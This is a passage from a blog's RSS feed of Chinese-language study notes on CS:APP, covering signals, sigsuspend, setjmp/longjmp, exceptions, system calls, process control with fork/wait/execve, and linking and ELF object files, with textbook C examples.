		addjob(pid); /* Add the child to the job list */ 
		Sigprocmask(SIG_SETMASK, &amp;amp;prev_all, NULL); 
	} 
	exit(0); 
}

void handler(int sig) { 
	int olderrno = errno; 
	sigset_t mask_all, prev_all; 
	pid_t pid; 
	
	Sigfillset(&amp;amp;mask_all); 
	while ((pid = waitpid(-1, NULL, 0)) &amp;gt; 0) { /* Reap child */ 
		Sigprocmask(SIG_BLOCK, &amp;amp;mask_all, &amp;amp;prev_all); 
		deletejob(pid); /* Delete the child from the job list */ 
		Sigprocmask(SIG_SETMASK, &amp;amp;prev_all, NULL); 
	} 
	if (errno != ECHILD) Sio_error(&amp;quot;waitpid error&amp;quot;); 
	errno = olderrno; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;问题在于子进程在父进程没来得及&lt;code&gt;addjob()&lt;/code&gt;之前就结束了,&lt;code&gt;handler()&lt;/code&gt;函数会删除列表中不存在的元素,然后父进程再把一个已经结束的进程加入工作列表.
所以对其修改如下:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int main(int argc, char **argv) { 
	int pid; 
	sigset_t mask_all, mask_one, prev_one; 
	
	Sigfillset(&amp;amp;mask_all); Sigemptyset(&amp;amp;mask_one); 
	Sigaddset(&amp;amp;mask_one, SIGCHLD); 
	Signal(SIGCHLD, handler); 
	initjobs(); /* Initialize the job list */ 
	
	while (1) { 
	Sigprocmask(SIG_BLOCK, &amp;amp;mask_one, &amp;amp;prev_one); /* Block SIGCHLD */ 
		if ((pid = Fork()) == 0) { /* Child process */ 
			Sigprocmask(SIG_SETMASK, &amp;amp;prev_one, NULL); /* Unblock SIGCHLD */ 
			Execve(&amp;quot;/bin/date&amp;quot;, argv, NULL); 
		} 
	Sigprocmask(SIG_BLOCK, &amp;amp;mask_all, NULL); /* Parent process */ 
	addjob(pid); /* Add the child to the job list */ 
	Sigprocmask(SIG_SETMASK, &amp;amp;prev_one, NULL); /* Unblock SIGCHLD */ 
	} 
	exit(0); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;显式等待信号:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int sigsuspend(const sigset_t *mask);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;相当于有原子性的&lt;code&gt;pause()&lt;/code&gt;函数.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;volatile sig_atomic_t pid; 

void sigchld_handler(int s) { 
	int olderrno = errno; 
	pid = Waitpid(-1, NULL, 0); /* Main is waiting for nonzero pid */ 
	errno = olderrno; 
} 

void sigint_handler(int s) { }

int main(int argc, char **argv) { 
	sigset_t mask, prev; 
	Signal(SIGCHLD, sigchld_handler); 
	Signal(SIGINT, sigint_handler); 
	Sigemptyset(&amp;amp;mask); 
	Sigaddset(&amp;amp;mask, SIGCHLD); 
	
	while (1) { 
		Sigprocmask(SIG_BLOCK, &amp;amp;mask, &amp;amp;prev); /* Block SIGCHLD */ 
		if (Fork() == 0) /* Child */
			 exit(0); 
			 
		/* Wait for SIGCHLD to be received */ 
		pid = 0; 
		while (!pid) 
			Sigsuspend(&amp;amp;prev); 
			
		/* Optionally unblock SIGCHLD */ 
		Sigprocmask(SIG_SETMASK, &amp;amp;prev, NULL); 
		/* Do some work after receiving SIGCHLD */ 
		printf(&amp;quot;.&amp;quot;); 
	} 
	exit(0); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;sigsuspend(&amp;amp;prev)&lt;/code&gt;函数在执行的时候,会在内部原子性地解除信号阻塞,然后是&lt;code&gt;pause()&lt;/code&gt;函数,最后重新加上信号阻塞.&lt;/p&gt;
&lt;h1&gt;C非本地跳转:setjmp/longjmp&lt;/h1&gt;
&lt;p&gt;从深层嵌套中立即返回&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int setjmp(jum_buf j);
void longjmp(jmp_buf j, int i);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;setjmp&lt;/code&gt;在jmp_buf中存储当前位置的栈指针记住当前位置,返回0.
&lt;code&gt;longjmp&lt;/code&gt;返回到&lt;code&gt;setjmp&lt;/code&gt;的位置,&lt;code&gt;setjmp&lt;/code&gt;返回i.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Deeply nested function foo */ 
void foo(void) { 
	if (error1) longjmp(buf, 1); 
	bar(); 
} 

void bar(void) { 
	if (error2) longjmp(buf, 2); 
}

jmp_buf buf; 
int error1 = 0; 
int error2 = 1; 

void foo(void), bar(void); 

int main() { 
	switch(setjmp(buf)) { 
	case 0: foo(); break; 
	case 1: printf(&amp;quot;Detected an error1 condition in foo\n&amp;quot;); break; 
	case 2: printf(&amp;quot;Detected an error2 condition in foo\n&amp;quot;); break; 
	default: printf(&amp;quot;Unknown error condition in foo\n&amp;quot;); 
	} 
	exit(0); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;太晦涩了,不易深究...&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Sat, 01 Feb 2025 16:00:00 GMT</pubDate></item><item><title>异常控制流(信号和非局部跳转)</title><link>https://tankimzeg.top/blog/csapp/exceptional-control-flow-i/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/exceptional-control-flow-i/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/exceptional-control-flow-i/&quot;&gt;https://tankimzeg.top/blog/csapp/exceptional-control-flow-i/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;控制流:处理器从开机到关机只做一件事:读取和执行一系列指令,这些指令就叫CPU的控制流.&lt;/p&gt;
&lt;h1&gt;异常控制流(ECF:Exceptional Control Flow)&lt;/h1&gt;
&lt;p&gt;ECF存在于计算机系统的所有层次&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;底层机制&lt;ul&gt;
&lt;li&gt;&lt;ol&gt;
&lt;li&gt;异常:由系统状态改变引发,由硬件和操作系统软件共同实现.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;高层机制&lt;ul&gt;
&lt;li&gt;&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;上下文切换&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;信号&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;非局部跳转&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;异常(Exception)&lt;/h1&gt;
&lt;p&gt;异常是将控制权交给操作系统内核,作为对某些事件的回应.
内核是操作系统始终驻留在内存中的部分.
事件如:除以0/算术溢出/页错误/IO请求完成/Ctrl+C.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201175658.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;异常表&lt;/h2&gt;
&lt;p&gt;每种异常事件都有一个异常码,当异常事件k发生时,硬件使用k作为异常表的索引,然后跳转到处理该异常的程序的地址处.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201180030.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;异步异常(中断)&lt;/h2&gt;
&lt;p&gt;由处理器外部设备引发.通过在处理器上设置引脚,向处理器通知这些状态的变化.发生中断后,处理器返回到下一条指令.
例如:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;计时器中断
  系统有一个内置计时器,每隔几毫秒就中断一次.
  内核用这个机制再次取得对用户程序的控制权.&lt;/li&gt;
&lt;li&gt;I/O中断
  Ctrl+C/收到网络包/收到磁盘数据&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;同步异常&lt;/h2&gt;
&lt;p&gt;由以下三种引发:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;陷阱(Traps)
  程序故意引发的.如系统调用.返回到下一条指令&lt;/li&gt;
&lt;li&gt;错误(Faults)
  非故意但可能可以恢复.如页错误&lt;/li&gt;
&lt;li&gt;终止(Aborts)
  非故意且不可恢复&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;系统调用&lt;/h3&gt;
&lt;p&gt;每一个x86-64系统调用都有一个独一无二的ID,如:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;名称&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;read&lt;/td&gt;
&lt;td&gt;read file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;write&lt;/td&gt;
&lt;td&gt;write file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;open&lt;/td&gt;
&lt;td&gt;open file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;close&lt;/td&gt;
&lt;td&gt;close file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;stat&lt;/td&gt;
&lt;td&gt;get info about file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;57&lt;/td&gt;
&lt;td&gt;fork&lt;/td&gt;
&lt;td&gt;创建进程&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;59&lt;/td&gt;
&lt;td&gt;execve&lt;/td&gt;
&lt;td&gt;执行程序&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;60&lt;/td&gt;
&lt;td&gt;_exit&lt;/td&gt;
&lt;td&gt;终止进程&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;62&lt;/td&gt;
&lt;td&gt;kill&lt;/td&gt;
&lt;td&gt;向进程发送信号&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;调用 &lt;code&gt;open(filename, options)&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;00000000000e5d70 &amp;lt;__open&amp;gt;: 
... 
e5d79: b8 02 00 00 00        mov $0x2,%eax # open is syscall #2 
e5d7e: 0f 05                 syscall       # Return value in %rax 
e5d80: 48 3d 01 f0 ff ff     cmp $0xfffffffffffff001,%rax 
... 
e5dfa: c3                    retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;%rax包含调用ID;如果open出错,会返回负数的errno,执行对应的错误处理.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201183604.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;页错误&lt;/h3&gt;
&lt;p&gt;磁盘上的一个可执行文件可能很大,根据局部性原理,只有一部分加载到内存中,当执行涉及的内存区域没有被加载过来时就会发生页缺失异常.这时候需要去硬盘中把这部分内存加载进来.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201184544.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;无效内存引用&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201184825.png&quot; alt=&quot;&quot;&gt;
内核向用户进程发送SIGSEGV信号,用户进程segmentation fault 退出.&lt;/p&gt;
&lt;h1&gt;进程(Process)&lt;/h1&gt;
&lt;p&gt;进程是一个正在运行的程序的实例.
进程的两个关键抽象:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;逻辑控制流
  每个进程似乎独占CPU:不用担心别的程序会修改寄存器,也无法分辨系统中有其他进程正在运行.&lt;/li&gt;
&lt;li&gt;私有地址空间
  虚拟内存机制提供,每个进程似乎独占内存:都有内存空间,也不能看到其他进程正在使用的内存.
即使在单核系统上,这些进程实际上是在同一时间并发运行
(我的1vCPU服务器,top界面出现了2 running)
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201231945.png&quot; alt=&quot;&quot;&gt;
操作系统如何实现多进程调度?&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;单核系统
 单核处理器 &lt;strong&gt;并发(concurrently)&lt;/strong&gt; 处理多个进程
 当异常发生时,操作系统可以决定是否要运行另一个进程
 &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201232845.png&quot; alt=&quot;&quot;&gt;
 进程切换时,将寄存器的值复制到内存中保存,然后调度到下一个待执行的进程
 &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201232903.png&quot; alt=&quot;&quot;&gt;
 它将加载上次保存的寄存器的值,地址空间也将切换.
 **上下文切换(context switch)**就是寄存器和地址空间的切换.&lt;/li&gt;
&lt;li&gt;多核系统
 每个核处理一个进程,也会发生上下文切换.
 &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201234209.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;并发,顺序,并行
   &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201235607.png&quot; alt=&quot;&quot;&gt;
   &lt;strong&gt;并发(concurrent)&lt;/strong&gt; : A&amp;amp;B,A&amp;C;  &lt;strong&gt;顺序(sequential)&lt;/strong&gt; : B&amp;amp;C
   &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201235722.png&quot; alt=&quot;&quot;&gt;
   A&amp;amp;B,A&amp;amp;C &lt;strong&gt;并行(parallel)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;上下文切换
  每个进程都是一个逻辑控制流.内核管理进程,通过&lt;strong&gt;上下文切换&lt;/strong&gt;,控制流从一个进程切换到另一个进程.
  &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250202000758.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;进程控制(Process Control)&lt;/h1&gt;
&lt;h2&gt;系统调用的错误处理&lt;/h2&gt;
&lt;p&gt;Linux系统层面函数一旦发生错误,经常返回-1,并且设置全局变量errno的值来指示原因.返回指针(句柄)的函数发生错误返回空指针.
为了安全,在调用系统函数时,必须检查返回值.例如,我们可以将&lt;code&gt;fork&lt;/code&gt;函数包装成:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void unix_error(char *msg){
	fprintf(stderr, &amp;quot;%s: %s\n&amp;quot;, msg, strerror(errno));
	exit(0);
}
pid_t Fork(void){
	pid_t pid;
	if((pid = fork()) &amp;lt; 0)
		unix_error(&amp;quot;Fork error&amp;quot;);
	return pid;
}

pid = Fork();
pid_t getpid(void);     /*获取当前进程的PID */
pid_t getppid(void);    /* 获取父进程的PID */
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;创建/终止进程&lt;/h2&gt;
&lt;p&gt;进程处在以下三种状态之一:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;运行
 进程正在被执行,或者等待执行并且后面会被内核调度.&lt;/li&gt;
&lt;li&gt;停止
 暂停执行,并且在进一步通知之前不会调度.&lt;/li&gt;
&lt;li&gt;终止
 永久停止&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;终止一个进程的三种方式:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;收到一个信号,默认是终止进程&lt;/li&gt;
&lt;li&gt;从&lt;code&gt;main&lt;/code&gt;函数正常返回&lt;/li&gt;
&lt;li&gt;调用了&lt;code&gt;exit&lt;/code&gt;函数&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;创建进程:&lt;/h3&gt;
&lt;p&gt;父进程通过调用&lt;code&gt;fork&lt;/code&gt;函数能创建一个子进程.子进程是父进程的副本.
&lt;code&gt;int fork(void)&lt;/code&gt;函数在子进程返回0,在父进程返回子进程的PID.
子进程和父进程并行执行,无法保证哪一个先执行.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这部分编程,我已经在网络编程中接触过了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;通过进程图(Process Graph)来理解fork:
对于复杂的进程,可以画出进程图来分析,例如:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void fork4()
{
	printf(&amp;quot;L0\n&amp;quot;);
	if(fork() != 0){
		printf(&amp;quot;L1\n&amp;quot;);
		if(fork() != 0)
			printf(&amp;quot;L2\n&amp;quot;);
	}
	printf(&amp;quot;Bye\n&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;的进程图:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250202224500.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;回收fork进程&lt;/h3&gt;
&lt;p&gt;僵尸进程:当程序终止后仍然占有系统资源
子进程不会自动回收,父进程可以使用&lt;code&gt;wait&lt;/code&gt;或&lt;code&gt;waitpid&lt;/code&gt;函数回收子进程,父进程得到子进程退出状态,内核删除僵尸子进程.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**僵尸(Zombie)**进程的例子:&lt;ol&gt;
&lt;li&gt;子进程退出了,父进程不退出&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void fork7() { 
    if (fork() == 0) { 
        /* Child */ 
        printf(&amp;quot;Terminating Child, PID = %d\n&amp;quot;, getpid());
        exit(0); 
    } else { 
        printf(&amp;quot;Running Parent, PID = %d\n&amp;quot;, getpid()); 
        while (1) ; 
        /* Infinite loop */ 
    } 
}
&lt;/code&gt;&lt;/pre&gt;
kill父进程后,init进程回收子进程.&lt;/li&gt;
&lt;li&gt;父进程退出了,子进程不退出
 在父进程终止后,子进程依然在活跃.kill子进程后,子进程才终止.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以看到,如果父进程不管管子进程的话,是可能会导致一些问题的.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;wait&lt;/code&gt;函数:暂停父进程直到一个子进程终止&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int wait(int *child_status);
/* 整数*child_status被设置为子进程退出状态码 */
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;waitpid&lt;/code&gt;函数:暂停当前进程直到特定进程终止&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;加载/运行程序&lt;/h3&gt;
&lt;p&gt;要在进程内运行不同的程序,使用名为 &lt;code&gt;exicve&lt;/code&gt; 的函数:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int execve(char *filename, char *argv[], char *envp[]);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过调用 &lt;code&gt;execve&lt;/code&gt; 函数,进程以全新程序替换当前运行的程序,将丢弃原程序,,堆栈/数据/代码都会被新程序替换只有PID保留.所以 &lt;code&gt;execve&lt;/code&gt;永远不会返回,除非无法执行.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用例
  在子进程中执行&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;/bin/ls -lt /usr/include
&lt;/code&gt;&lt;/pre&gt;
  参数为:
  &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250202235349.png&quot; alt=&quot;&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;if((pid = Fork())==0){
    /* 子进程运行程序 */
    if(execve(myargv[0], myargv, environ) &amp;lt; 0){
        printf(&amp;quot;%s: Command not found.\n&amp;quot;, myargv[0]);
        exit(1);
    }    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Fri, 31 Jan 2025 16:00:00 GMT</pubDate></item><item><title>链接</title><link>https://tankimzeg.top/blog/csapp/linking/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/linking/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/linking/&quot;&gt;https://tankimzeg.top/blog/csapp/linking/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;链接过程&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* main.c */
int sum(int *a, int n);
int array[2] = {1,2};
int main(){
	int val = sum(array, 2);
	return val;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* sum.c */
int sum(int *a, int n){
	int i, s = 0;
	for(i=0;i&amp;lt;n;i++){
		s += a[i];	
	}
	return s;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;静态链接&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -Og -o prog main.c sum.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201110702.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;使用链接器的原因&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;模块化&lt;/li&gt;
&lt;li&gt;高效&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;时间:修改一部分源文件无需重新编译其他源文件&lt;/li&gt;
&lt;li&gt;空间:提升复用性(库函数)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;连接器的行为&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;符号解析(Symbol Resolution)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;程序定义和引用符号(函数和全局变量)&lt;/li&gt;
&lt;li&gt;汇编器将符号定义存储在目标文件的符号表中&lt;ul&gt;
&lt;li&gt;符号表是结构体数组,每个成员包含名称,大小,位置等信息&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;符号解析过程中,连接器将每个符号引用跟符号定义关联起来.&lt;ul&gt;
&lt;li&gt;&lt;p&gt;三类链接器符号&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;全局符号
  模块中能够被其他模块使用的符号,如非static的函数和全局变量&lt;/li&gt;
&lt;li&gt;外部符号
  由其他模块定义的全局符号&lt;/li&gt;
&lt;li&gt;局部符号
  在模块中定义且只能在该模块中使用的符号,如static函数和变量&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;局部非静态变量存储在堆栈上&lt;/li&gt;
&lt;li&gt;局部静态变量存储在.data或.bss中&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int f(){
    static int x=2;
    return x;
}
int g(){
    static int x=1;
    return x;
}
int h(){
    int x=5;
    return x;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  虽然 &lt;code&gt;f()&lt;/code&gt;和 &lt;code&gt;g()&lt;/code&gt;函数的静态变量都叫x,但编译器用别名(x.1,x.2)会加以区分.
  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;强符号和弱符号&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;强符号:函数定义和已初始化的全局变量&lt;/li&gt;
&lt;li&gt;弱符号:未初始化的全局变量&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;符号规则&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;不允许多个同名的强符号&lt;/li&gt;
&lt;li&gt;同名的一个强符号和多个弱符号,选择强符号
 引用弱符号将被解析到强符号的定义处&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int x=5;
int y=7;
void p1(){}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;double x;
void p2(){}
&lt;/code&gt;&lt;/pre&gt;
 在p2中使用x,会改变y的值!&lt;/li&gt;
&lt;li&gt;多个同名的弱符号,任意选择一个
 使用&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -fno-common
&lt;/code&gt;&lt;/pre&gt;
 杜绝这种行为.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;建议&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;减少使用全局变量&lt;/li&gt;
&lt;li&gt;定义时初始化&lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;static&lt;/code&gt;和 &lt;code&gt;extern&lt;/code&gt;加以限制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;重定向(Relocation)
把分离的代码和数据合并在可执行文件的一个板块内.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201141301.png&quot; alt=&quot;&quot;&gt;
在重定向前,编译器生成的目标文件的函数和数据的地址只是它在模块中的偏移量,链接器决定当程序执行时它们存储在哪里,将地址和符号绑定起来.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201141713.png&quot; alt=&quot;&quot;&gt;
===========================&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201141819.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;三类目标文件&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;可重定位目标文件( *.o)
汇编器的输出;可以和其他.o文件由连接器合并为可执行目标文件.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;可执行目标文件(a.out)
连接器输出的可执行文件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;共享目标文件(*.so)
动态链接库(dll),运行时加载.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;可执行可链接格式(ELF)&lt;/h1&gt;
&lt;p&gt;以上三种目标文件的标准统一格式
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201113741.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ELF header
定义了字长,字节序,文件类型,机器类型&lt;/li&gt;
&lt;li&gt;段头部表&lt;/li&gt;
&lt;li&gt;.text
代码&lt;/li&gt;
&lt;li&gt;.rodata 
只读数据,如跳转表&lt;/li&gt;
&lt;li&gt;.data
有初始化的全局变量&lt;/li&gt;
&lt;li&gt;.bss 
未初始化的全局变量&lt;/li&gt;
&lt;li&gt;.symtab
包含程序全局变量的结构体数组;stactic变量&lt;/li&gt;
&lt;li&gt;.rel.text
需要在可执行目标文件中重定位的指令&lt;/li&gt;
&lt;li&gt;.rel.data
需要在可执行目标文件中重定位的数据&lt;/li&gt;
&lt;li&gt;.debug
&lt;code&gt;gcc -g&lt;/code&gt;
包含了源代码的行号与机器代码的行号相关联的信息&lt;/li&gt;
&lt;li&gt;节头部表
每个section的偏移量和大小.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;加载可执行目标文件&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201142208.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;库:打包常用函数&lt;/h1&gt;
&lt;p&gt;通过静态链接常用函数的源文件,有两种实现方式:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将所有常用函数写在一个源文件中,这会导致生成的目标文件冗余&lt;/li&gt;
&lt;li&gt;将每个函数写在单独的源文件中,这会导致链接命令非常长
为了解决这个问题,引入了链接库的技术.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;静态链接库(.a文件)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;原理&lt;ul&gt;
&lt;li&gt;链接多个.o文件成一个文档&lt;/li&gt;
&lt;li&gt;当连接器遇到未解析的外部引用时,去文档中寻找该符号&lt;/li&gt;
&lt;li&gt;如果能找到,将其链接进可执行目标文件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;创建静态库
  &lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250201144113.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;使用静态库&lt;ul&gt;
&lt;li&gt;链接器解析外部引用的算法:&lt;ul&gt;
&lt;li&gt;按照命令行顺序扫描.o和.a文件&lt;/li&gt;
&lt;li&gt;扫描过程中,维护一个未解析引用列表&lt;/li&gt;
&lt;li&gt;每次遇到一个新的.o或.a文件,尝试在其中解析未解析引用&lt;/li&gt;
